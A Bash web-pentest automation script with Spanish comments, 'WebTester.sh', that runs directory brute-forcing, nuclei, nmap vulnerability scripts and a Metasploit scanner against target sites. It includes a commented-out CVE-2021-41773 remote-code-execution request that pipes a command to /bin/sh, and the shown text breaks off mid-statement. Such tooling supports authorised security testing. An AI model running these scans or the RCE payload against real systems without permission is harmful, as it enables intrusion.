#!/bin/bash
#FIX  clone site cuando se revisa servicios/web.txt valor $DOMINIO parece incorrecto
OKBLUE='\033[94m'
THREADS="30"
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'


# usamos un bucle while para recorrer todos los argumentos

while (( "$#" )); do
  case "$1" in
    --url)
      URL=$2
      shift 2
      ;;
	--target)
      TARGETS=$2
      shift 2
      ;;
	--speed) #1->1 hilo /2-> 5 hilos /3-> 10 hilos
      SPEED=$2
      shift 2
      ;;
    --mode)
      MODE=$2
      shift 2
      ;;
    --proxychains)
      PROXYCHAINS=$2
      shift 2
      ;;
    --hosting)
      HOSTING=$2
      shift 2
      ;;
    --internet)
      INTERNET=$2 #s/n
      shift 2
      ;;
    --ipList)
      IP_LIST_FILE=$2
      shift 2
      ;;
    --domain)
      DOMINIO=$2
      shift 2
      ;;
	--extratest)
      EXTRATEST=$2 # oscp = aspx/php file bruteforce + web crawling + sqli + xss
      shift 2
      ;;
	--specific)
      ESPECIFIC=$2 # 1 = esperar guardar sitio del navegador usar blackwidow/sqlmap/dalfox
      shift 2
      ;;
    --verbose)
      VERBOSE=$2
      shift 2
      ;;
	--force)
      FORCE=$2 # si tiene el valor "internet" (se esta escaneando redes de internet)
      shift 2
      ;;
    --) # end argument parsing
      shift
      break
      ;;
    -*|--*=) # unsupported flags
      echo "Error: Flag no soportada $1" >&2
      exit 1
      ;;
    *) # preserve positional arguments
      PARAMS="$PARAMS $1"
      shift
      ;;
  esac
done

# set positional arguments in their proper place
eval set -- "$PARAMS"

MIN_RAM=900;
MAX_SCRIPTS=4
hilos_web=10
webScaneado=0 # para saber si escaneo algun sitio web
path_web='/'
webservers_defaultTitles=("IIS Windows Server" "Apache2 Ubuntu Default Page: It works" "Apache default page" "Apache2 Debian Default Page: It works")
source /usr/share/lanscanner/api_keys.conf


NOscanList=$(cat << EOL
cisco
Router
BladeSystem
oracle
302 Found
Coyote
Express
AngularJS
Zimbra
Pfsense
GitLab
Roundcube
Zentyal
Taiga
Always200-OK
Nextcloud
Open Source Routing Machine
ownCloud
GoAhead-Webs
printer
Vuejs
TrueConf Server Guest Page
networkMonitoring
erpnext
Payara
openresty
Huawei
Cloudflare
Outlook
owa
SharePoint
SoftEther
EOL
)

TOKEN_WPSCAN=${API_WPSCAN[$RANDOM % ${#API_WPSCAN[@]}]}
echo "TOKEN_WPSCAN: $TOKEN_WPSCAN"

if [[  ${SPEED} == "1" ]]; then
	hilos_web=1
	MAX_SCRIPT_INSTANCES=10

fi
if [[  ${SPEED} == "2" ]]; then
	hilos_web=3
	MAX_SCRIPT_INSTANCES=30
fi
if [[  ${SPEED} == "3" ]]; then
	hilos_web=1
	MAX_SCRIPT_INSTANCES=250
fi

echo "hilos_web $hilos_web"

if [[ -z $TARGETS && -z $URL ]] ; then

cat << "EOF"
WebTester.sh v2
Options:
--mode: hacking/total
--proxychains: s/n
--hosting: s/n
--specific: 1 = esperar guardar sitio del navegador usar blackwidow/sqlmap/dalfox
--extratest: oscp
	*aspx/php file bruteforce
	*web crawling
	*sqli
	*xss
--internet s/n
	* slowloris
	* waf detection
	* clone site
	* Metadata


Para escanear una sola aplicacion:
webTester.sh --url https://ypfb.com.bo --mode $MODE --hosting $HOSTING --internet $INTERNET --verbose $VERBOSE --specific 1

Para escanear varias aplicaciones web
webTester.sh --target servicios/web.txt --mode hacking --proxychains s --hosting n --internet n --ipList vivos.txt --domain www.ypfb.com.bo --verbose 1
EOF
exit
fi

if [ ! -d "servicios" ]; then #si no existe la carpeta servicios es un nuevo escaneo
	echo "creando carpetas"
	mkdir .enumeracion 2>/dev/null
	mkdir .enumeracion2 2>/dev/null
	mkdir .banners 2>/dev/null
	mkdir .banners2 2>/dev/null
	mkdir .vulnerabilidades	2>/dev/null
	mkdir .vulnerabilidades2 2>/dev/null
	mkdir reportes
	mkdir -p webClone/ 2>/dev/null
	mkdir -p logs/enumeracion
	mkdir -p logs/vulnerabilidades
    mkdir responder
	mkdir servicios
	cp /usr/share/lanscanner/.resultados.db .
else
	echo "no crear carpetas"
fi

# si escaneamos una sola app https://prueba.com.bo | http://192.168.1.2:8080 | https://prueba.com.bo/login
if [ ! -z $URL ] ; then #
	#cat $TARGETS | cut -d ":" -f1 | sort | uniq > hosts-lives.txt
	http_proto_http=$(echo ${URL} | cut -d'/' -f1 | tr -d ':')
	echo "Protocolo: $http_proto_http"

	# Extraer host
	host=$(echo ${URL} | cut -d'/' -f3 | cut -d':' -f1)
	echo "Host: $host"

	# Extraer puerto
	port=$(echo ${URL} | cut -d'/' -f3 | cut -d':' -f2)
	# Verificar si la URL contiene un puerto
	if [[ $port =~ ^[0-9]+$ ]] ; then
		echo "Puerto: $port"
	else
		if [[  ${http_proto_http} == *"https"* ]]; then
			port="443"
		else
			port="80"
		fi
		# En este caso, puerto puede contener parte de la ruta si la URL no tiene un puerto definido
	fi

	# Extraer ruta
	path_web="/"$(echo ${URL} | cut -d'/' -f4-)"/"
	# Reemplazar '//' con '/'
	path_web=${path_web//\/\//\/}

	if [[ "$URL" == *"localhost"* ]] || [[ "$URL" == *"127.0.0.1"* ]]; then
		echo "La URL contiene 'localhost'. Saliendo del programa."
		exit 1
	fi

	echo "" > servicios/web-app-tmp.txt #clear last scan

	# --url http://192.168.1.2:8080
	if [[ $host =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
		ip=$host
		echo "$ip:$port:$http_proto_http" >> servicios/web-app-tmp.txt
	else # --url https://prueba.com.bo
		DOMINIO=$host
		echo "DOMINIO $DOMINIO"
		echo "$DOMINIO:$port:$http_proto_http" >> servicios/web-app-tmp.txt
	fi
	sed -i ':a;N;$!ba;s/\n//g' servicios/web-app-tmp.txt

	TARGETS=servicios/web-app-tmp.txt
	cat $TARGETS | cut -d ":" -f 1 > servicios/hosts.txt
	IP_LIST_FILE="servicios/hosts.txt"
fi

path_web_sin_slash=$(echo "$path_web" | sed 's/\///g')
echo "path_web ($path_web)"
############### FUNCIONES ########################

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	find .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert-data.py 2>/dev/null
	mv .enumeracion/* .enumeracion2 2>/dev/null
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null
	mv .banners/* .banners2 2>/dev/null
	}


function checkRAM (){
	while true; do
		free_ram=`free -m | grep -i mem | awk '{print $7}'`
		script_instancias=$((`ps aux | egrep 'webData|passWeb|crackmap' | wc -l` - 1))
		python_instancias=$((`ps aux | grep get_ssl_cert | wc -l` - 1))
		script_instancias=$((script_instancias + python_instancias))

		if [[ $free_ram -lt $MIN_RAM  || $script_instancias -gt $MAX_SCRIPT_INSTANCES  ]];then
			echo "Poca RAM $free_ram MB ($script_instancias scripts activos)"
			sleep 3
		else
			break

		fi
	done
}

function insert_data_admin () {
	insert-data-admin.py 2>/dev/null

	cat servicios/admin-web-url.txt >> servicios/admin-web-url-inserted.txt 2>/dev/null
	rm servicios/admin-web-url.txt 2>/dev/null

	cat servicios/admin-web-fingerprint.txt >> servicios/admin-web-fingerprint-inserted.txt 2>/dev/null
	rm servicios/admin-web-fingerprint.txt 2>/dev/null

	}

function formato_ip {
    local ip=$1
    local stat=1

    # Verificar si la entrada es una dirección IP utilizando una expresión regular
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        IFS='.' read -ra ip_parts <<< "$ip"

        # Verificar cada octeto
        for i in "${ip_parts[@]}"; do
            if [[ $i -le 0 || $i -ge 255 ]]; then
                stat=1
                break
            else
                stat=0
            fi
        done
    fi

    return $stat
}


function waitFinish (){
	################# Comprobar que no haya scripts ejecutandose ########
	while true; do
		script_instancias=$((`ps aux | egrep 'webData|get_ssl_cert|buster|httpmethods.py|msfconsole|nmap|droopescan|CVE-2019-19781.sh|nuclei|owa.pl|curl|firepower.pl|wampServer|medusa|JoomlaJCKeditor.py|joomla-|testssl.sh|wpscan|joomscan' | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E|grep --color' | wc -l` ))
		echo -e "\tscript_instancias ($script_instancias)"
		if [[ $script_instancias -gt 0  ]];then
			echo -e "\t[-] Aun hay scripts en segundo plano activos"
			sleep 10
		else
			break
		fi
	done
}


#No permite que haya muchos script ejecutandose simultaneamente
function waitWeb (){
	######## wait to finish ########
	sleep $1
	  while true; do
	    free_ram=`free -m | grep -i mem | awk '{print $7}'`
		script_instancias=$((`ps aux | egrep "web-buster|webData|nmap|nuclei" | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E' | wc -l` - 1))
		#if [ "$VERBOSE" == '1' ]; then  echo "RAM=$free_ram"; date; fi
		if [[ $free_ram -lt $MIN_RAM || $script_instancias -gt $MAX_SCRIPT_INSTANCES  ]];then
			echo -e "\t[i] Todavia hay muchos escaneos de web-buster/webData activos ($script_instancias) RAM=$free_ram"
			sleep 5
		else
			break
		fi
	  done
	  ##############################
}
function enumeracionDefecto() {
    proto_http=$1
    host=$2
    port=$3

    echo -e "\t[+] Default enumeration ($proto_http : $host : $port)"

    waitWeb 0.3

    egrep -qiv "$NOscanList" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
    greprc=$?

    if [[ $greprc -eq 0 ]]; then
        #1: si no existe log
        if [[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_apacheNuclei.txt" ]]; then
            waitWeb 0.3
            echo -e "\t\t[+] Revisando paneles administrativos ($host - default)"
            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module admin -threads $hilos_web -redirects 0 -show404 $param_msg_error"
            echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt
            eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt &

            waitWeb 0.3
            echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - default)"
            checkerWeb.py --tipo phpinfo --url $proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_phpinfo.txt &
            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error"
            echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt
            eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt &

            waitWeb 0.3
            echo -e "\t\t[+] Revisando archivos peligrosos ($host - default)"
            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error"
            echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt
            eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt &
        fi

        if [[ "$MODE" == "total" || ! -z "$URL" ]]; then
            egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "$NOscanList"
            greprc=$?

            if [[ $greprc -eq 1 ]]; then
                waitWeb 0.3
                echo -e "\t\t[+] Revisando folders ($host - default)"
                command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
                echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt
                eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
            fi

            waitWeb 0.3
            echo -e "\t\t[+] Revisando backups de archivos genericos ($host - default)"
            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error"
            echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt
            eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt &

            waitWeb 0.3
            echo -e "\t\t[+] Revisando archivos por defecto ($host - default)"
            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
            echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt
            eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt &
        fi
    fi
}

function enumeracionSharePoint() {
    proto_http=$1
    host=$2
    port=$3

    #1: si no existe log
    if [[ ! -e "logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_SharePoint.txt" ]]; then
        echo -e "\t[+] Enumerar Sharepoint ($proto_http : $host : $port)"
        if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
            echo -e "\t\t[+] Revisando directorios comunes ($host - SharePoint)"
            waitWeb 0.3
            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 -error404 'something went wrong'"
            echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt
            eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
        fi

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos comunes de sharepoint ($host - SharePoint)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module sharepoint -threads $hilos_web -redirects 0 -show404 -error404 'something went wrong'"
        echo $command > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_SharePoint.txt
        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_SharePoint.txt &
    fi
}

function enumeracionIIS() {
    proto_http=$1
    host=$2
    port=$3

    #1: si no existe log
    if [[ ! -e "logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt" ]]; then
        echo -e "\t[+] Enumerar IIS ($proto_http : $host : $port)"
        egrep -iq "IIS/6.0|IIS/5.1" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
        IIS6=$?
        if [[ $IIS6 -eq 0 ]]; then
            echo -e "\t\t[+] Detectado IIS/6.0|IIS/5.1 - Revisando vulnerabilidad web-dav ($host - IIS)"
            echo "$proxychains  nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host" >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IISwebdavVulnerable.txt 2>/dev/null
            $proxychains nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IISwebdavVulnerable.txt 2>/dev/null &
        fi

        echo -e "\t\t[+] Revisando paneles administrativos ($host - IIS)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module admin -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt
        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos peligrosos ($host - IIS)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos genericos ($host - IIS)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - IIS)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt
        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos comunes de webservices ($host - IIS)"
        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module webservices -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_openWebservice.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_openWebservice.txt &
    fi

    if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
        egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "$NOscanList"
        greprc=$?
        if [[ $greprc -eq 1 ]]; then

            if [[ "$MODE" == "total" || ! -z "$URL" ]]; then

                waitWeb 0.3
                echo -e "\t\t[+] Revisando directorios comunes ($host - IIS)"
                waitWeb 0.3
                command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
                echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt
                eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &

                waitWeb 0.3
                echo -e "\t\t[+] Revisando archivos por defecto ($host - IIS)"
                command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
                echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt
                eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt &

                echo -e "\t\t[+] Revisando vulnerabilidad HTTP.sys ($host - IIS)"
                echo "$proxychains  nmap -p $port --script http-vuln-cve2015-1635.nse $host" >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_HTTPsys.txt
                $proxychains nmap -n -Pn -p $port --script http-vuln-cve2015-1635.nse $host >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_HTTPsys.txt &
                
                
                waitWeb 0.3
				echo -e "\t\t[+] Revisando la existencia de backdoors ($host - IIS)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module backdoorIIS -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt
				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt &

				waitWeb 0.3
				echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - IIS)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module backupIIS -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backupweb.txt
				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backupweb.txt &

				waitWeb 0.3
				echo -e "\t\t[+] certsrv ($host - IIS)"
				command="curl --max-time 10 -s -k -o /dev/null -w '%{http_code}' 'http://$host/certsrv/certfnsh.asp'"
				echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_certsrv.txt
				eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_certsrv.txt &

				#iis_shortname_scanner
				$proxychains msfconsole -x "use auxiliary/scanner/http/iis_shortname_scanner;set RHOSTS $host;exploit;exit" > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_shortname.txt 2>/dev/null &

			fi #total

			if [ "$EXTRATEST" == "oscp" ]; then
				waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos aspx ($host - IIS)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module aspx -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_aspx-files.txt
				eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_aspx-files.txt &
			fi #oscp
		fi	#NO CMS
	fi	#hosting domains
}

function enumeracionApi() {
    proto_http=$1
    host=$2
    port=$3
  	waitWeb 0.3
	echo -e "\t\t[+] Revisando archivos API ($host - nginx)"

	if [ ! -z "$msg_error_404" ];then
		# Eliminar el último carácter de msg_error_404
		msg_error_404_modified="${msg_error_404%?}"
		param_msg_error="-error404 $msg_error_404_modified|not found'" #parametro para web-buster
	else
		param_msg_error="-error404 'not found'"
	fi

	command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module api -threads $hilos_web -redirects 0 -show404 $param_msg_error"
	echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_api.txt
	eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_api.txt &
}

function enumeracionApache() {
    proto_http=$1
    host=$2
    port=$3

    #1: si no existe log
    if [[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_apacheNuclei.txt" ]]; then
        echo -e "\t\t[+] Enumerar Apache ($proto_http : $host : $port)"
        waitWeb 0.3
        echo -e "\t\t[+] Nuclei apache $proto_http $host:$port"
        command="nuclei -u '$proto_http://$host:$port' -id /root/.local/nuclei-templates/cves/apache.txt -no-color -include-rr -debug"
        echo $command > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheNuclei.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheNuclei.txt 2>&1 &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando paneles administrativos ($host - Apache/nginx)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module admin -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt
        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Apache/nginx)"
        checkerWeb.py --tipo phpinfo --url $proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_phpinfo.txt &
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module information -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos peligrosos ($host - Apache/nginx)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module archivosPeligrosos -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos genericos ($host - Apache/nginx)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module files -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt &

        waitWeb 0.3
        echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Apache/nginx)"
        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module webserver -threads $hilos_web -redirects 0 -show404 $param_msg_error"
        echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt
        eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt &

        # CVE-2021-4177
        echo -e "\t\t[+] Revisando apache traversal)"
        command="$proxychains apache-traversal.py --target $host --port $port"
        echo $command > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheTraversal.txt
        eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheTraversal.txt 2>&1 &

        # cve-2021-41773
        #echo -e "\t\t[+] Revisando cve-2021-41773 (RCE)"
        #command="$proxychains curl -k --max-time 10 $proto_http://$host:$port/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id'"
        #echo $command > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cve-2021-41773.txt
        #eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cve-2021-41773.txt 2>&1 &
    fi

	if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
		egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt | egrep -qiv "$NOscanList"
		greprc=$?
		if [[ $greprc -eq 1 ]]; then

			if [[ "$MODE" == "total" || ! -z "$URL" ]]; then

				waitWeb 0.3
				echo -e "\t\t[+] Revisando directorios comunes ($host - Apache/nginx)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command > logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt
				eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt &
				sleep 1

				waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos por defecto ($host - Apache/nginx)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module default -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt
				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt &

				waitWeb 0.3
				echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - Apache/nginx)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module backupApache -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backupweb.txt
				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backupweb.txt &

				waitWeb 0.3
				echo -e "\t\t[+] Revisando la existencia de backdoors ($host - Apache/nginx)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module backdoorApache -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt
				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt &

				echo -e "\t\t[+] multiviews check ($proto_http://$host:$port)"
				command="multiviews -url=$proto_http://$host:$port/"
				echo $command > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apache-multiviews.txt
				eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apache-multiviews.txt
				grep vulnerable logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apache-multiviews.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apache-multiviews.txt
			fi #total

			if [ "$EXTRATEST" == "oscp" ]; then
				waitWeb 0.3
				echo -e "\t\t[+] Revisando archivos php ($host - Apache/nginx)"
				command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module php -threads $hilos_web -redirects 0 -show404 $param_msg_error"
				echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_php-files.txt
				eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_php-files.txt &

			fi #oscp
		fi #NO CMS
	fi #hosting domains

	if [[ "$INTERNET" == "s" ]] && [[ "$MODE" == "total" ]]; then
		waitWeb 0.3
		echo -e "\t\t[+] Revisando vulnerabilidad slowloris ($host)"
		command="$proxychains nmap --script http-slowloris-check -p $port $host"
		echo $command > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_slowloris.txt
		eval $command >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_slowloris.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_slowloris.txt
	fi

	if [ "$INTERNET" == "n" ]; then
		waitWeb 0.3
		echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
		command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module cgi -threads $hilos_web -redirects 0 -show404 $param_msg_error"
		echo $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt
		eval $command >> logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt &

	else
